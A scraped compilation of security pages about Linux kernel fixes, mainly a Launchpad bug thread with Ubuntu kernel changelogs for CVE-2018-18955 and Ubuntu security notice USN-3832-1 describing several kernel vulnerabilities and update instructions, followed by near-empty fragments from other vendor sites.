- KVM: s390: device attrs to enable/disable AP interpretation
- KVM: s390: CPU model support for AP virtualization
- s390: doc: detailed specifications for AP virtualization
- KVM: s390: fix locking for crypto setting error path
- KVM: s390: Tracing APCB changes
- s390: vfio-ap: setup APCB mask using KVM dedicated function
- s390/zcrypt: Add ZAPQ inline function.
- s390/zcrypt: Review inline assembler constraints.
- s390/zcrypt: Integrate ap\_asm.h into include/asm/ap.h.
- s390/zcrypt: fix ap\_instructions\_available() returncodes
- s390/zcrypt: remove VLA usage from the AP bus
- s390/zcrypt: Remove deprecated ioctls.
- s390/zcrypt: Remove deprecated zcrypt proc interface.
- s390/zcrypt: Support up to 256 crypto adapters.
- [Config:] Enable CONFIG\_S390\_AP\_IOMMU and set CONFIG\_VFIO\_AP to module.
\* Bypass of mount visibility through userns + mount propagation (LP: #1789161)
- mount: Retest MNT\_LOCKED in do\_umount
- mount: Don't allow copying MNT\_UNBINDABLE|MNT\_LOCKED mounts
\* CVE-2018-18955: nested user namespaces with more than five extents
incorrectly grant privileges over inode (LP: #1801924) // CVE-2018-18955
- userns: also map extents in the reverse map to kernel IDs
\* kdump fail due to an IRQ storm (LP: #1797990)
- SAUCE: x86/PCI: Export find\_cap() to be used in early PCI code
- SAUCE: x86/quirks: Add parameter to clear MSIs early on boot
- SAUCE: x86/quirks: Scan all busses for early PCI quirks
-- Thadeu Lima de Souza Cascardo <cascardo@canonical.com> Thu, 15 Nov 2018 17:01:46 -0200

| Changed in linux (Ubuntu Bionic): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2019-02-04: |  |  | [#8](/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/8) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/comments/8/%2Bdownload) (14.1 KiB)

This bug was fixed in the package linux - 4.19.0-12.13

---------------

linux (4.19.0-12.13) disco; urgency=medium

\* linux: 4.19.0-12.13 -proposed tracker (LP: [#1813664](/bugs/1813664))

\* kernel oops in bcache module (LP: [#1793901](/bugs/1793901))

    - SAUCE: bcache: never writeback a discard operation

\* Disco update: 4.19.18 upstream stable release (LP: [#1813611](/bugs/1813611))

    - ipv6: Consider sk\_bound\_dev\_if when binding a socket to a v4 mapped address

    - mlxsw: spectrum: Disable lag port TX before removing it

    - mlxsw: spectrum\_switchdev: Set PVID correctly during VLAN deletion

    - net: dsa: mv88x6xxx: mv88e6390 errata

    - net, skbuff: do not prefer skb allocation fails early

    - qmi\_wwan: add MTU default to qmap network interface

    - ipv6: Take rcu\_read\_lock in \_\_inet6\_bind for mapped addresses

    - net: clear skb->tstamp in bridge forwarding path

    - netfilter: ipset: Allow matching on destination MAC address for mac and

      ipmac sets

    - gpio: pl061: Move irq\_chip definition inside struct pl061

    - drm/amd/display: Guard against null stream\_state in set\_crc\_source

    - drm/amdkfd: fix interrupt spin lock

    - ixgbe: allow IPsec Tx offload in VEPA mode

    - platform/x86: asus-wmi: Tell the EC the OS will handle the display off

      hotkey

    - e1000e: allow non-monotonic SYSTIM readings

    - usb: typec: tcpm: Do not disconnect link for self powered devices

    - selftests/bpf: enable (uncomment) all tests in test\_libbpf.sh

    - of: overlay: add missing of\_node\_put() after add new node to changeset

    - writeback: don't decrement wb->refcnt if !wb->bdi

    - serial: set suppress\_bind\_attrs flag only if builtin

    - bpf: Allow narrow loads with offset > 0

    - ALSA: oxfw: add support for APOGEE duet FireWire

    - x86/mce: Fix -Wmissing-prototypes warnings

    - MIPS: SiByte: Enable swiotlb for SWARM, LittleSur and BigSur

    - crypto: ecc - regularize scalar for scalar multiplication

    - arm64: perf: set suppress\_bind\_attrs flag to true

    - drm/atomic-helper: Complete fake\_commit->flip\_done potentially earlier

    - clk: meson: meson8b: fix incorrect divider mapping in cpu\_scale\_table

    - samples: bpf: fix: error handling regarding kprobe\_events

    - usb: gadget: udc: renesas\_usb3: add a safety connection way for

      forced\_b\_device

    - fpga: altera-cvp: fix probing for multiple FPGAs on the bus

    - selinux: always allow mounting submounts

    - ASoC: pcm3168a: Don't disable pcm3168a when CONFIG\_PM defined

    - scsi: qedi: Check for session online before getting iSCSI TLV data.

    - drm/amdgpu: Reorder uvd ring init before uvd resume

    - rxe: IB\_WR\_REG\_MR does not capture MR's iova field

    - efi/libstub: Disable some warnings for x86{,\_64}

    - jffs2: Fix use of uninitialized delayed\_work, lockdep breakage

    - clk: imx: make mux parent strings const

    - pstore/ram: Do not treat empty buffers as valid

    - media: uvcvideo: Refactor teardown of uvc on USB disconnect

    - powerpc/xmon: Fix invocation inside lock region

    - powerpc/pseries/cpuidle: Fix preempt warning

    - media: firewire: Fix app\_info parameter type in avc\_ca{,\_app}\_info

    - ASoC: use dma\_ops of parent device for acp\_audio\_dma

    - media: ve...

This bug was fixed in the package linux - 4.19.0-12.13
---------------
linux (4.19.0-12.13) disco; urgency=medium
\* linux: 4.19.0-12.13 -proposed tracker (LP: #1813664)
\* kernel oops in bcache module (LP: #1793901)
- SAUCE: bcache: never writeback a discard operation
\* Disco update: 4.19.18 upstream stable release (LP: #1813611)
- ipv6: Consider sk\_bound\_dev\_if when binding a socket to a v4 mapped address
- mlxsw: spectrum: Disable lag port TX before removing it
- mlxsw: spectrum\_switchdev: Set PVID correctly during VLAN deletion
- net: dsa: mv88x6xxx: mv88e6390 errata
- net, skbuff: do not prefer skb allocation fails early
- qmi\_wwan: add MTU default to qmap network interface
- ipv6: Take rcu\_read\_lock in \_\_inet6\_bind for mapped addresses
- net: clear skb->tstamp in bridge forwarding path
- netfilter: ipset: Allow matching on destination MAC address for mac and
ipmac sets
- gpio: pl061: Move irq\_chip definition inside struct pl061
- drm/amd/display: Guard against null stream\_state in set\_crc\_source
- drm/amdkfd: fix interrupt spin lock
- ixgbe: allow IPsec Tx offload in VEPA mode
- platform/x86: asus-wmi: Tell the EC the OS will handle the display off
hotkey
- e1000e: allow non-monotonic SYSTIM readings
- usb: typec: tcpm: Do not disconnect link for self powered devices
- selftests/bpf: enable (uncomment) all tests in test\_libbpf.sh
- of: overlay: add missing of\_node\_put() after add new node to changeset
- writeback: don't decrement wb->refcnt if !wb->bdi
- serial: set suppress\_bind\_attrs flag only if builtin
- bpf: Allow narrow loads with offset > 0
- ALSA: oxfw: add support for APOGEE duet FireWire
- x86/mce: Fix -Wmissing-prototypes warnings
- MIPS: SiByte: Enable swiotlb for SWARM, LittleSur and BigSur
- crypto: ecc - regularize scalar for scalar multiplication
- arm64: perf: set suppress\_bind\_attrs flag to true
- drm/atomic-helper: Complete fake\_commit->flip\_done potentially earlier
- clk: meson: meson8b: fix incorrect divider mapping in cpu\_scale\_table
- samples: bpf: fix: error handling regarding kprobe\_events
- usb: gadget: udc: renesas\_usb3: add a safety connection way for
forced\_b\_device
- fpga: altera-cvp: fix probing for multiple FPGAs on the bus
- selinux: always allow mounting submounts
- ASoC: pcm3168a: Don't disable pcm3168a when CONFIG\_PM defined
- scsi: qedi: Check for session online before getting iSCSI TLV data.
- drm/amdgpu: Reorder uvd ring init before uvd resume
- rxe: IB\_WR\_REG\_MR does not capture MR's iova field
- efi/libstub: Disable some warnings for x86{,\_64}
- jffs2: Fix use of uninitialized delayed\_work, lockdep breakage
- clk: imx: make mux parent strings const
- pstore/ram: Do not treat empty buffers as valid
- media: uvcvideo: Refactor teardown of uvc on USB disconnect
- powerpc/xmon: Fix invocation inside lock region
- powerpc/pseries/cpuidle: Fix preempt warning
- media: firewire: Fix app\_info parameter type in avc\_ca{,\_app}\_info
- ASoC: use dma\_ops of parent device for acp\_audio\_dma
- media: venus: core: Set dma maximum segment size
- staging: erofs: fix use-after-free of on-stack `z\_erofs\_vle\_unzip\_io'
- net: call sk\_dst\_reset when set SO\_DONTROUTE
- scsi: target: use consistent left-aligned ASCII INQUIRY data
- scsi: target/core: Make sure that target\_wait\_for\_sess\_cmds() waits long
enough
- selftests: do not macro-expand failed assertion expressions
- arm64: kasan: Increase stack size for KASAN\_EXTRA
- clk: imx6q: reset exclusive gates on init
- arm64: Fix minor issues with the dcache\_by\_line\_op macro
- bpf: relax verifier restriction on BPF\_MOV | BPF\_ALU
- kconfig: fix file name and line number of warn\_ignored\_character()
- kconfig: fix memory leak when EOF is encountered in quotation
- mmc: atmel-mci: do not assume idle after atmci\_request\_end
- btrfs: volumes: Make sure there is no overlap of dev extents at mount time
- btrfs: alloc\_chunk: fix more DUP stripe size handling
- btrfs: fix use-after-free due to race between replace start and cancel
- btrfs: improve error handling of btrfs\_add\_link
- tty/serial: do not free trasnmit buffer page under port lock
- perf intel-pt: Fix error with config term "pt=0"
- perf tests ARM: Disable breakpoint tests 32-bit
- perf svghelper: Fix unchecked usage of strncpy()
- perf parse-events: Fix unchecked usage of strncpy()
- perf vendor events intel: Fix Load\_Miss\_Real\_Latency on SKL/SKX
- netfilter: ipt\_CLUSTERIP: check MAC address when duplicate config is set
- netfilter: ipt\_CLUSTERIP: remove wrong WARN\_ON\_ONCE in netns exit routine
- netfilter: ipt\_CLUSTERIP: fix deadlock in netns exit routine
- x86/topology: Use total\_cpus for max logical packages calculation
- dm crypt: use u64 instead of sector\_t to store iv\_offset
- dm kcopyd: Fix bug causing workqueue stalls
- perf stat: Avoid segfaults caused by negated options
- tools lib subcmd: Don't add the kernel sources to the include path
- dm snapshot: Fix excessive memory usage and workqueue stalls
- perf cs-etm: Correct packets swapping in cs\_etm\_\_flush()
- perf tools: Add missing sigqueue() prototype for systems lacking it
- perf tools: Add missing open\_memstream() prototype for systems lacking it
- quota: Lock s\_umount in exclusive mode for Q\_XQUOTA{ON,OFF} quotactls.
- clocksource/drivers/integrator-ap: Add missing of\_node\_put()
- dm: Check for device sector overflow if CONFIG\_LBDAF is not set
- Bluetooth: btusb: Add support for Intel bluetooth device 8087:0029
- ALSA: bebob: fix model-id of unit for Apogee Ensemble
- sysfs: Disable lockdep for driver bind/unbind files
- IB/usnic: Fix potential deadlock
- scsi: mpt3sas: fix memory ordering on 64bit writes
- scsi: smartpqi: correct lun reset issues
- ath10k: fix peer stats null pointer dereference
- scsi: smartpqi: call pqi\_free\_interrupts() in pqi\_shutdown()
- scsi: megaraid: fix out-of-bound array accesses
- iomap: don't search past page end in iomap\_is\_partially\_uptodate
- ocfs2: fix panic due to unrecovered local alloc
- mm/page-writeback.c: don't break integrity writeback on ->writepage() error
- mm/swap: use nr\_node\_ids for avail\_lists in swap\_info\_struct
- userfaultfd: clear flag if remap event not enabled
- mm, proc: be more verbose about unstable VMA flags in /proc/<pid>/smaps
- iwlwifi: mvm: Send LQ command as async when necessary
- Bluetooth: Fix unnecessary error message for HCI request completion
- ipmi: fix use-after-free of user->release\_barrier.rda
- ipmi: msghandler: Fix potential Spectre v1 vulnerabilities
- ipmi: Prevent use-after-free in deliver\_response
- ipmi:ssif: Fix handling of multi-part return messages
- ipmi: Don't initialize anything in the core until something uses it
- Linux 4.19.18
\* tls selftest failures/hangs on i386 (LP: #1813607)
- [Config] CONFIG\_TLS=n for i386
\* Intel XL710 - i40e driver does not work with kernel 4.15 (Ubuntu 18.04)
(LP: #1779756)
- i40e: prevent overlapping tx\_timeout recover
\* Disco update: 4.19.17 upstream stable release (LP: #1813016)
- tty/ldsem: Wake up readers after timed out down\_write()
- tty: Don't hold ldisc lock in tty\_reopen() if ldisc present
- can: gw: ensure DLC boundaries after CAN frame modification
- netfilter: nf\_conncount: replace CONNCOUNT\_LOCK\_SLOTS with CONNCOUNT\_SLOTS
- netfilter: nf\_conncount: split gc in two phases
- netfilter: nf\_conncount: restart search when nodes have been erased
- netfilter: nf\_conncount: merge lookup and add functions
- netfilter: nf\_conncount: move all list iterations under spinlock
- netfilter: nf\_conncount: speculative garbage collection on empty lists
- netfilter: nf\_conncount: fix argument order to find\_next\_bit
- mmc: sdhci-msm: Disable CDR function on TX
- Revert "scsi: target: iscsi: cxgbit: fix csk leak"
- scsi: target: iscsi: cxgbit: fix csk leak
- scsi: target: iscsi: cxgbit: fix csk leak
- arm64/kvm: consistently handle host HCR\_EL2 flags
- arm64: Don't trap host pointer auth use to EL2
- ipv6: fix kernel-infoleak in ipv6\_local\_error()
- net: bridge: fix a bug on using a neighbour cache entry without checking its
state
- packet: Do not leak dev refcounts on error exit
- tcp: change txhash on SYN-data timeout
- tun: publish tfile after it's fully initialized
- lan743x: Remove phy\_read from link status change function
- smc: move unhash as early as possible in smc\_release()
- r8169: don't try to read counters if chip is in a PCI power-save state
- bonding: update nest level on unlink
- ip: on queued skb use skb\_header\_pointer instead of pskb\_may\_pull
- r8169: load Realtek PHY driver module before r8169
- crypto: sm3 - fix undefined shift by >= width of value
- crypto: caam - fix zero-length buffer DMA mapping
- crypto: authencesn - Avoid twice completion call in decrypt path
- crypto: ccree - convert to use crypto\_authenc\_extractkeys()
- crypto: bcm - convert to use crypto\_authenc\_extractkeys()
- crypto: authenc - fix parsing key with misaligned rta\_len
- crypto: talitos - reorder code in talitos\_edesc\_alloc()
- crypto: talitos - fix ablkcipher for CONFIG\_VMAP\_STACK
- xen: Fix x86 sched\_clock() interface for xen
- Revert "btrfs: balance dirty metadata pages in btrfs\_finish\_ordered\_io"
- btrfs: wait on ordered extents on abort cleanup
- Yama: Check for pid death before checking ancestry
- scsi: core: Synchronize request queue PM status only on successful resume
- scsi: sd: Fix cache\_type\_store()
- mips: fix n32 compat\_ipc\_parse\_version
- MIPS: BCM47XX: Setup struct device for the SoC
- MIPS: lantiq: Fix IPI interrupt handling
- drm/i915/gvt: Fix mmap range check
- OF: properties: add missing of\_node\_put
- mfd: tps6586x: Handle interrupts on suspend
- media: v4l: ioctl: Validate num\_planes for debug messages
- RDMA/nldev: Don't expose unsafe global rkey to regular user
- RDMA/vmw\_pvrdma: Return the correct opcode when creating WR
- kbuild: Disable LD\_DEAD\_CODE\_DATA\_ELIMINATION with ftrace & GCC <= 4.7
- net: dsa: realtek-smi: fix OF child-node lookup
- pstore/ram: Avoid allocation and leak of platform data
- arm64: kaslr: ensure randomized quantities are clean to the PoC
- arm64: dts: marvell: armada-ap806: reserve PSCI area
- Disable MSI also when pcie-octeon.pcie\_disable on
- fix int\_sqrt64() for very large numbers
- omap2fb: Fix stack memory disclosure
- media: vivid: fix error handling of kthread\_run
- media: vivid: set min width/height to a value > 0
- bpf: in \_\_bpf\_redirect\_no\_mac pull mac only if present
- ipv6: make icmp6\_send() robust against null skb->dev
- LSM: Check for NULL cred-security on free
- media: vb2: vb2\_mmap: move lock up
- sunrpc: handle ENOMEM in rpcb\_getport\_async
- netfilter: ebtables: account ebt\_table\_info to kmemcg
- block: use rcu\_work instead of call\_rcu to avoid sleep in softirq
- selinux: fix GPF on invalid policy
- blockdev: Fix livelocks on loop device
- sctp: allocate sctp\_sockaddr\_entry with kzalloc
- tipc: fix uninit-value in in tipc\_conn\_rcv\_sub
- tipc: fix uninit-value in tipc\_nl\_compat\_link\_reset\_stats
- tipc: fix uninit-value in tipc\_nl\_compat\_bearer\_enable
- tipc: fix uninit-value in tipc\_nl\_compat\_link\_set
- tipc: fix uninit-value in tipc\_nl\_compat\_name\_table\_dump
- tipc: fix uninit-value in tipc\_nl\_compat\_doit
- block/loop: Don't grab "struct file" for vfs\_getattr() operation.
- block/loop: Use global lock for ioctl() operation.
- loop: Fold \_\_loop\_release into loop\_release
- loop: Get rid of loop\_index\_mutex
- loop: Push lo\_ctl\_mutex down into individual ioctls
- loop: Split setting of lo\_state from loop\_clr\_fd
- loop: Push loop\_ctl\_mutex down into loop\_clr\_fd()
- loop: Push loop\_ctl\_mutex down to loop\_get\_status()
- loop: Push loop\_ctl\_mutex down to loop\_set\_status()
- loop: Push loop\_ctl\_mutex down to loop\_set\_fd()
- loop: Push loop\_ctl\_mutex down to loop\_change\_fd()
- loop: Move special partition reread handling in loop\_clr\_fd()
- loop: Move loop\_reread\_partitions() out of loop\_ctl\_mutex
- loop: Fix deadlock when calling blkdev\_reread\_part()
- loop: Avoid circular locking dependency between loop\_ctl\_mutex and bd\_mutex
- loop: Get rid of 'nested' acquisition of loop\_ctl\_mutex
- loop: Fix double mutex\_unlock(&loop\_ctl\_mutex) in loop\_control\_ioctl()
- loop: drop caches if offset or block\_size are changed
- drm/fb-helper: Ignore the value of fb\_var\_screeninfo.pixclock
- selftests: Fix test errors related to lib.mk khdr target
- media: vb2: be sure to unlock mutex on errors
- nbd: Use set\_blocksize() to set device blocksize
- Linux 4.19.17
\* Enable sound card power saving by default (LP: #1804265)
- [Config] CONFIG\_SND\_HDA\_POWER\_SAVE\_DEFAULT=1
\* Fix non-working QCA Rome Bluetooth after S3 (LP: #1812812)
- USB: Add new USB LPM helpers
- USB: Consolidate LPM checks to avoid enabling LPM twice
\* [SRU] Fix Xorg crash with nomodeset when BIOS enable 64-bit fb addr
(LP: #1812797)
- vgaarb: Add support for 64-bit frame buffer address
- vgaarb: Keep adding VGA device in queue
\* bluetooth controller not detected with 4.15 kernel (LP: #1810797)
- SAUCE: btqcomsmd: introduce BT\_QCOMSMD\_HACK
- [Config] arm64: snapdragon: BT\_QCOMSMD\_HACK=y
\* [19.04 FEAT| Enable virtio-gpu for s390x (LP: #1799467)
- [Config] enable virtio-gpu for s390x
\* Miscellaneous Ubuntu changes
- Revert "UBUNTU: SAUCE: selftests: disable some failing networking tests"
- SAUCE: selftests: net: replace AF\_MAX with INT\_MAX in socket.c
- SAUCE: selftests/ftrace: Fix tab expansion in trace\_marker snapshot trigger
test
- update dkms package versions
\* Miscellaneous upstream changes
- selftests/ftrace: Fix checkbashisms errors
- selftests/powerpc/pmu: Link ebb tests with -no-pie
-- Seth Forshee <seth.forshee@canonical.com> Mon, 28 Jan 2019 15:38:30 -0600

| Changed in linux (Ubuntu Disco): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

[Brad Figg (brad-figg)](https://launchpad.net/~brad-figg)
on 2019-07-24

| **tags**: | added: cscc |
| --- | --- |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/linux/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [v1-0001-userns-defer-setting-up-reverse-mappings.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Battachment/5209678/%2Bfiles/v1-0001-userns-defer-setting-up-reverse-mappings.patch)
  [Edit](/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Battachment/5209678 "Change patch details")

* [Add patch](/ubuntu/%2Bsource/linux/%2Bbug/1801924/%2Baddcomment?field.patch=on)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from support.f5.com_311d548c_20250124_213119.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from usn.ubuntu.com_0ae604c9_20250124_213121.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3832-1: Linux kernel (AWS) vulnerabilities

30 November 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 18.10](/security/notices?release=cosmic)

## Packages

* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems

## Details

Jann Horn discovered that the procfs file system implementation in the

Linux kernel did not properly restrict the ability to inspect the kernel

stack of an arbitrary task. A local attacker could use this to expose

sensitive information. ([CVE-2018-17972](/security/CVE-2018-17972))

Jann Horn discovered that the mremap() system call in the Linux kernel did

not properly flush the TLB when completing, potentially leaving access to a

physical page after it has been released to the page allocator. A local

attacker could use this to cause a denial of service (system crash), expose

sensitive information, or possibly execute arbitrary code. ([CVE-2018-18281](/security/CVE-2018-18281))

It was discovered that the BPF verifier in the Linux kernel did not

correctly compute numeric bounds in some situations. A local attacker could

use this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2018-18445](/security/CVE-2018-18445))

Daniel Dadap discovered that the module loading implementation in the Linux

kernel did not properly enforce signed module loading when booted with UEFI

Secure Boot in some situations. A local privileged attacker could use this

to execute untrusted code in the kernel. ([CVE-2018-18653](/security/CVE-2018-18653))

Jann Horn discovered that the Linux kernel mishandles mapping UID or GID

ranges inside nested user namespaces in some situations. A local attacker

could use this to bypass access controls on resources outside the

namespace. ([CVE-2018-18955](/security/CVE-2018-18955))

Philipp Wendler discovered that the overlayfs implementation in the Linux

kernel did not properly verify the directory contents permissions from

within a unprivileged user namespace. A local attacker could use this to

expose sensitive information (protected file names). ([CVE-2018-6559](/security/CVE-2018-6559))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 18.10

* [linux-image-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.18.0.1006.6](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.18.0-1006.7)
* [linux-image-4.18.0-1006-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.18.0-1006.7](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.18.0-1006.7)

After a standard system update you need to reboot your computer to make

all the necessary changes.

XXX MAYBE WITH XXX

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-17972](/security/CVE-2018-17972)
* [CVE-2018-18281](/security/CVE-2018-18281)
* [CVE-2018-18445](/security/CVE-2018-18445)
* [CVE-2018-18653](/security/CVE-2018-18653)
* [CVE-2018-18955](/security/CVE-2018-18955)
* [CVE-2018-6559](/security/CVE-2018-6559)

## Related notices

* [USN-3821-1](/security/notices/USN-3821-1)
* [USN-3880-2](/security/notices/USN-3880-2)
* [USN-3871-4](/security/notices/USN-3871-4)
* [USN-3871-1](/security/notices/USN-3871-1)
* [USN-3871-5](/security/notices/USN-3871-5)
* [USN-3835-1](/security/notices/USN-3835-1)
* [USN-3880-1](/security/notices/USN-3880-1)
* [USN-3871-3](/security/notices/USN-3871-3)
* [USN-3821-2](/security/notices/USN-3821-2)
* [USN-3847-2](/security/notices/USN-3847-2)
* [USN-3847-3](/security/notices/USN-3847-3)
* [USN-3847-1](/security/notices/USN-3847-1)
* [USN-3833-1](/security/notices/USN-3833-1)
* [USN-3836-1](/security/notices/USN-3836-1)
* [USN-3836-2](/security/notices/USN-3836-2)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from security.netapp.com_eaf46361_20250126_033841.html ===

[Skip to main content](#n-main-content)

